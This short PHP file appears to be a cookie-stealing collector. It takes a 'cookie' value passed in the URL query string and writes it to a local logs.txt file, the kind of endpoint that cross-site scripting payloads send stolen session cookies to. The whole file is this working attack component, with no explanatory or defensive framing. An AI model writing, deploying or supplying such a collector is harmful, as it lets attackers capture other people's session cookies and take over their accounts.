<?php
	$cookie = $_GET['cookie'];
	$filename = "logs.txt";

	$logs = fopen($filename, "w");
	fwrite($logs, $cookie);

	fclose($logs);
?>